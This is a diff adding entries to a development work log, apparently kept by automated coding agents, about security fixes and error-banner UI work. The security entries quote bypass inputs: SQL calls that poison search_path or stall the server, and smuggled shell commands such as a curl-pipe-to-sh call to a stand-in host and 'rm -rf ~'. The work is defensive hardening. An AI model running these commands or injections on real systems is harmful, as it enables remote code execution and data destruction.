@@ -257,6 +257,79 @@ listed one after another), exhaust memory, or bounce requests to internal hosts.
 - (pending push) Harden pc_run_shell with human UI approvals; ignore client confirm.
 
 
+## Security fix: pglite_query side-effect function bypass (2026-11-01 Africa/Lagos)
+
+**Status:** done — fixed, regression-tested, pushed. Commit c2266bb.
+
+### Weakness (confirmed live on an in-memory PGLite)
+`assertReadOnlySql` only blocked write keywords, so any SELECT that *calls* a state-changing function passed:
+- `SELECT set_config('search_path','evil',false)` persisted on the shared single connection, poisoning every later app query.
+- `U&"\0073et_config"(...)` (unicode-escaped name) and `"set_config"(...)` (quoted name) hid the function from word checks.
+- `SELECT pg_sleep(2)` ran the full 2s despite a 500ms timeout: PGLite runs synchronously in the Node event loop and ignores statement_timeout, so a long call freezes the whole server.
+- `pg_advisory_lock`, `lo_create`, `query_to_xml('<sql>')`, `FOR SHARE` row locks, and `SELECT ... INTO` also got through.
+- Plain EXPLAIN never worked (it was wrapped in a subquery).
+
+### Fix
+- Denylist of side-effect / file / backend / nested-SQL / blocking functions (checked with quotes stripped), refuse U& escapes, nested or unterminated block comments, locking reads, INTO/PREPARE/LOCK, EXPLAIN ANALYZE, SQL over 20,000 chars and NUL bytes.
+- Plain EXPLAIN runs unwrapped; rows capped client-side; timeout timer is cleared.
+
+### Checks
+- New `src/lib/mind/mcp/pglite-guard.test.ts` (24 tests on real PGLite): 23 fail against the old guard, all pass now; confirms search_path, sequence, advisory locks, and tables are untouched after every attack.
+- typecheck pass; mind/src tests 320/320; build pass; `npm run mcp:e2e` pass (pglite_query ok).
+
+### Open
+- CPU-heavy pure reads (e.g. huge `generate_series` or cross joins) can still block PGLite's event loop; a real fix needs running PGLite in a worker so a timeout can terminate it.
+- DNS rebinding for http MCP servers (from the previous cycle) still open.
+
+## Security fix: pc_run_shell allowlist bypass via shell metacharacters (2026-11-01 Africa/Lagos)
+
+**Status:** done — fixed, regression-tested, pushed. Commit 230a05d.
+
+### Weakness (confirmed locally)
+The allowlist entry `/^echo /` only checked the start of the command, so anything
+beginning with `echo ` counted as allowlisted and ran on the paired PC **without
+human approval** (it skipped the H9 approval flow and was sent with `confirm: true`):
+`echo hi; curl http://evil.invalid/x | sh`, `echo a && rm -rf ~`, `echo $(id)`,
+`` echo `id` ``, `echo a > ~/.bashrc`, `echo x<newline>rm -rf /`, `echo %USERPROFILE%`.
+Repro: `isShellAllowlisted("echo hi; curl … | sh") === true`. `pcRunShell` passed that
+command straight to the paired runner (no approval created) and also POSTed it to the
+legacy `MIND_PC_AGENT_URL /run`. A prompt-injected model could use this to run any
+command on Zack's PC.
+
+### Fix (`src/lib/mind/mcp/tools.ts`, `isShellAllowlisted`)
+- An allowlisted command must use only plain characters `[A-Za-z0-9 _.,:=+/-]`, be at most 200 chars, and match an allowlist pattern from start to end. `echo` arguments are limited to the same plain set.
+- Anything with chaining, substitution, redirection, globbing, quotes or escapes, `%`/`^`, `!`, `#`, or control characters is no longer allowlisted. It goes to the existing human approval flow.
+- `pwd`, `date`, `whoami`, `uname [-x]`, and plain `echo words` still run as before.
+
+### Checks
+- `tools.test.ts`: 5 new regression tests (32 smuggled commands refused, plain commands still allowed, smuggled echo goes to approval and the runner is never called, the legacy agent URL is never fetched, plain echo still runs). 3 of them failed before the fix. All pass now.
+- typecheck: pass. mind/src tests: 325/325. scripts tests: 198/202 (the same 4 SKILL.md/AGENTS.md doc-check failures as before; not related). build: pass. `npm run mcp:e2e`: pass.
+- Note: on the first full run, 2 timing tests failed (registry-http hang→timeout, stdio list/call) because box load average was around 220. Both passed when re-run alone, and the full suite then passed 325/325.
+
+### Open
+- `/api/mind/mcp/servers` (toggle/register/remove) and `/api/mind/mcp/call` POSTs have no Origin/same-site check. The SameSite=Lax cookie blocks cross-site requests, but same-site sibling origins (for example other preview subdomains) could still send them. `assertSameSiteRequest` exists in `src/lib/auth/isolation.server.ts`. Next cycle candidate.
+- DNS rebinding for http MCP servers is still open.
+- CPU-heavy pure reads can still block PGLite's event loop (needs a worker).
+
+## Gap: H12 pglite comment-strip / string-literal bypass (2026-11-01, Africa/Lagos)
+
+**Status:** complete (2026-11-01T15:09:29+01:00)  
+**Lock:** `mcp-integration-gap-pglite-comment-strip-bypass.lock`
+
+### Bug
+`assertReadOnlySql` stripped `--` / `/* */` with regexes that ignored string literals, so
+`SELECT '--' AS a, set_config(...)` and `SELECT '/*' AS a, pg_sleep(60), '*/' AS b` passed the guard.
+
+### Fix
+- Quote-aware tokenizer (`tokenizeSqlForGuard`): single quotes (`''`), `E''` backslash escapes, dollar quotes `$$` / `$tag$`, double-quoted idents, `--` and nested `/* */` only outside literals.
+- Keyword / side-effect function checks run on **identifier tokens**, not raw comment-stripped text.
+- Defense in depth in `pgliteQuery`: `RESET ALL` before query, `BEGIN READ ONLY` … `ROLLBACK`, then `RESET ALL` again (verified on real PGLite).
+
+### Verification
+- `tsc --noEmit`: pass
+- mind/src tests: **336/336** (incl. H12 cases in `pglite-guard.test.ts` on real PGLite)
+- `npm run build`: pass
+
 
 ## 2026-11-01T14:45:02+01:00 (Africa/Lagos) — Error Banners Bot — connector status stuck fixed
 - Gap: ServiceBoard cards stuck on "Checking connection…" (GitHub/Gmail/Drive/Calendar/Slack); Notion "status could not be read" on preview/integration.
@@ -318,6 +391,89 @@ listed one after another), exhaust memory, or bounce requests to internal hosts.
 - Notion: https://app.notion.com/p/40bb95f33e4281d7a921c1780538952d
 - Open: the onFailure target in command-app is "browser" (owned by another lane). The inline banner has no View log; the top banner provides it.
 
+## 2026-11-01T17:30:59+01:00 (Africa/Lagos) — Error Banners Bot — H16 fleet-panels silent lists
+- Lock check: no ACTIVE exclusive claim on fleet-panels.tsx; claimed error-banners-gap-fleet-panels-silent-lists.lock.
+- Merged origin/preview/integration @ 7518a1d into error-banners as b00088e (package.json test union; no forbidden conflicts).
+- 9fe7482: MCP tools + PC approvals distinct loading/empty/error (red banner + Retry); mcp-list-state timeout 15s + stale generation guards; failure-states mcp_tools_list_failed / pc_approvals_list_failed. onFailure→reportFailure for audit + top View log (826aa99 pattern).
+- Checks: typecheck pass; TS 797/799 (2 pre-existing: integration-security-c16 Imagine allowlist deferred; voice/ollama-conductor — present without H16 edits); lint 32e/55w other lanes (our files 0e/1w hooks); build pass.
+- Pushed origin/error-banners → 9fe7482b0d91dc90992de376eb18ff3774d21c2e (ls-remote matches).
+- Notion requested page 40b1aa27632381768d58cde0731f142a still 404; child under mirror: https://app.notion.com/p/40bb95f33e4281d0b385c9a20bbae697
+- Open: inline View log needs command-app.tsx (forbidden); FleetPanel onFailure still tagged open_page_failed/browser there.
+- Lock releasing.
+
+## 2026-11-01T17:35:39+01:00 (Africa/Lagos) — Error Banners Bot — H17 worker-health silent status
+- Gap: Scheduled panel `workerHealth().catch` → muted "Nothing is reported as online" with no red Retry/View log (gap audit #12 / H16 follow-on).
+- Lock: /workspace/locks/error-banners-gap-worker-health-silent.lock
+- Lock check: no ACTIVE exclusive claim on fleet-panels.tsx / failure-states / mcp-list-state; claimed worker-health gap.
+- Merged origin/preview/integration @ 7f3e641 into error-banners as dd1e237 (nav Dashboard Link; no forbidden conflicts).
+- Fix: loadWorkerHealthStatus + WorkerHealthStatusRows (loading/ready/error); timeout 15s + stale generation; honest offline/local stays ready; load failures → red banner + onceListRetry + onFailure→reportFailure. failure-states worker_health_failed → network_failure.
+- Checks: typecheck pass; TS 806/808 (2 pre-existing: integration-security-c16 Imagine allowlist deferred; voice/ollama-conductor — present without H17 edits); lint our files 0e/2w hooks; build pass.
+- Notion requested page 40b1aa27632381768d58cde0731f142a still 404; child under mirror: https://app.notion.com/p/40bb95f33e4281ffa97ddfb8c11cf266
+- Pushed origin/error-banners → 673b9ec72209959350994602f3389c4328200708 (ls-remote matches).
+- Lock releasing.
+
+## 2026-11-01T17:38:37+01:00 (Africa/Lagos) — Error Banners Bot — H18 PC approve/deny action banners
+- Gap: Tools panel Approve/Deny catch → muted pcApprovalNote only; HTTP ok:false also muted.
+- Lock: /workspace/locks/error-banners-gap-pc-approve-deny.lock
+- preview/integration unchanged @ 7f3e641 (no merge needed).
+- Fix: pc-approval-action.ts runPcApprovalAction + snapshot params + PcApprovalActionStatusRows; onceRetry; onFailure→reportFailure. failure-states pc_approve_failed / pc_deny_failed.
+- Checks: typecheck pass; TS 811/813 (2 pre-existing); lint our files 0e; build pass.
+- Notion requested page 40b1aa27… still 404; child: https://app.notion.com/p/40bb95f33e42816b8d15c9f6e5037f9b
+- Pushed origin/error-banners → e59f339afdc6b1d72338c5f1b1d502a1fb905dfd
+- Lock releasing.
+
+## 2026-11-01T17:40:11+01:00 (Africa/Lagos) — Error Banners Bot — H19 MCP Try SELECT 1 call banner
+- Gap: Tools panel Try SELECT 1 catch → muted mcpCallNote; status error/timeout also muted.
+- Lock: /workspace/locks/error-banners-gap-mcp-try-select.lock (no mcp/ touched).
+- preview/integration still @ 7f3e641.
+- Fix: mcp-call-action.ts under src/lib/mind; snapshot serverId/tool/sql; onceRetry; onFailure→reportFailure.
+- Checks: typecheck pass; TS 815/817 (2 pre-existing); lint our files 0e; build pass.
+- Notion requested page 40b1aa27… still 404; child: https://app.notion.com/p/40bb95f33e428113ad87df9f6beaf908
+- Pushed origin/error-banners → 109c2f9d4e965c1a1197dd9253947765e99c68b7
+- Lock releasing.
+
+## 2026-11-01T17:41:30+01:00 (Africa/Lagos) — Error Banners Bot — H20 copy-code clipboard banner
+- Gap: message-body Copy code .catch → setCopied(null) silent (H10).
+- Lock: error-banners-gap-copy-code.lock; markdown lock done/released.
+- Fix: copy-code-action.ts; red banner + Retry re-copies identical text; optional onFailure for View log (command-app mount still forbidden).
+- Checks: typecheck pass; TS 819/821 (2 pre-existing); lint 0e; build pass.
+- Notion requested page 40b1aa27… still 404; child: https://app.notion.com/p/40bb95f33e42812d9ca0f88a58319ab4
+- Pushed origin/error-banners → 27ad1018f777dc5439bc386c7fd2eca66bd72851
+- Lock releasing.
+
+## 2026-11-01T17:43:02+01:00 (Africa/Lagos) — Error Banners Bot — H21 memory-manager action banner
+- Gap: MemoryManagerView setError → bare red text, no Retry/View log.
+- Lock: error-banners-gap-memory-manager.lock; memory-ux locks done/released.
+- Fix: memory-action.ts; MemoryActionFailureBanner + onceRetry of identical save_new/save_edit/delete params; optional onFailure (command-app mount still forbidden).
+- Checks: typecheck pass; TS 823/825 (2 pre-existing); lint 0e; build pass.
+- Notion requested page 40b1aa27… still 404; child: https://app.notion.com/p/40bb95f33e4281ba9ee0c9041e792007
+- Pushed origin/error-banners → 464fe8f9ffbbcd700e649ed7e565dc9351e8b524
+- Lock releasing.
+
+## 2026-11-01T17:45:28+01:00 (Africa/Lagos) — Error Banners Bot — H22 STOPPED_REPLY user_stopped
+- Gap: intentional Stop (STOPPED_REPLY) fell through to reportFailure as chat_failed red banner.
+- Lock: error-banners-gap-stopped-reply.lock; failure-states free (dashboard lock only forbids Dashboard from editing it).
+- preview/integration still @ 7f3e641 (no merge).
+- Fix (src/lib/mind only; command-app NOT edited): STOPPED_REPLY + isUserStoppedReply + classifyHonestTurnOutcome("user_stopped") + shouldShowFailureBanner(false) + honestTurnAuditAction("user_stopped") + failureBannerMountHint(). Timeouts/disconnects still chat_timeout/network_failure with banners. Agent "Stopped after N tool steps." unchanged (still bannerable unclassified).
+- Mount for another lane (one line before reportFailure): `if (!shouldShowFailureBanner(message)) { setNotice(message); return null; }`
+- Checks: typecheck pass; TS 830/832 (2 pre-existing); lint our files 0e; build pass.
+- Notion requested page 40b1aa27… still 404; child: https://app.notion.com/p/40bb95f33e42810bad93f2cd22be479d
+- Pushed origin/error-banners → f24d1252d5766ff3ed13abf73b9cfa52451090ed
+- Lock releasing.
+
+## 2026-11-01T18:08:30+01:00 (Africa/Lagos) — Error Banners Bot — H23 MCP auth_required notice
+- Gap: live adrians-mind.vercel.app paints MCP auth_required as blocking red failure banners before sign-in.
+- Lock: /workspace/locks/error-banners-gap-auth-required-notice.lock
+- Merge origin/preview/integration ABORTED (conflict in forbidden command-app.tsx). Branch remains behind PI.
+- Root cause: mcp-list-state FleetListStatusRowsInner treated auth_required as failure-banner; fleet-panels onFailure escalated; command-app loadMcpLists catch ≈603–613 also reportFailure (owning lane — not edited).
+- Fix: AuthRequiredNoticeRow + LIST_AUTH_NOTICE_COPY; skip onFailure for auth; shouldShowFailureBanner(false) for auth_required; mount hint for command-app.
+- Checks: typecheck pass; TS 833/836 (3 pre-existing); lint our files 0e; build pass.
+- Notion requested page 40b1aa27632381768d58cde0731f142a still 404; child: https://app.notion.com/p/40bb95f33e42812b841ece22e9e38f99
+- Pushed origin/error-banners → 413595890690100e7b5d710ba40da8a8aa4a4aee
+- Lock releasing.
+
+## Voice Integration lane note (preserved from voice-integration branch)
+
 ---
 
 ## Voice Integration Bot notes (preserved from voice-integration merge)
@@ -350,3 +506,4 @@ listed one after another), exhaust memory, or bounce requests to internal hosts.
 - Tests: typecheck; 239/239; build; no styles.css/voice-ui
 - Tester barge-in: voice-overlay-open → get TTS speaking → voice-interrupt or talk over → Interrupted — listening
 - Notion: page 40bb95f3-3e42-814a-acf8-c3281b4f528d
+
